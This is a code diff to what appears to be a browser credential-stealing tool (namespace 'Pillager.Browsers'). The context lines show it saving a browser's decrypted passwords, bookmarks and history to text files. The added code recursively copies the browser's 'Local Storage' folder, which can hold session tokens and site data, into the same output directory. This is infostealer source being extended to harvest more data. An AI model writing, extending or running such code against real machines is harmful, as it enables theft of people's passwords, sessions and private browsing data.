@@ -206,6 +206,31 @@ namespace Pillager.Browsers
             return stringBuilder.ToString();
         }
 
+        static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
+        {
+            var dir = new DirectoryInfo(sourceDir);
+
+            if (!dir.Exists)
+                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");
+
+            DirectoryInfo[] dirs = dir.GetDirectories();
+            Directory.CreateDirectory(destinationDir);
+            foreach (FileInfo file in dir.GetFiles())
+            {
+                string targetFilePath = Path.Combine(destinationDir, file.Name);
+                file.CopyTo(targetFilePath);
+            }
+
+            if (recursive)
+            {
+                foreach (DirectoryInfo subDir in dirs)
+                {
+                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
+                    CopyDirectory(subDir.FullName, newDestinationDir, true);
+                }
+            }
+        }
+
         public void Save(string path)
         {
             if (MasterKey==null)
@@ -222,6 +247,10 @@ namespace Pillager.Browsers
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+            if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage")))
+            {
+                CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"),true);
+            }
             Console.WriteLine("Files wrote to " + savepath);
         }
     }
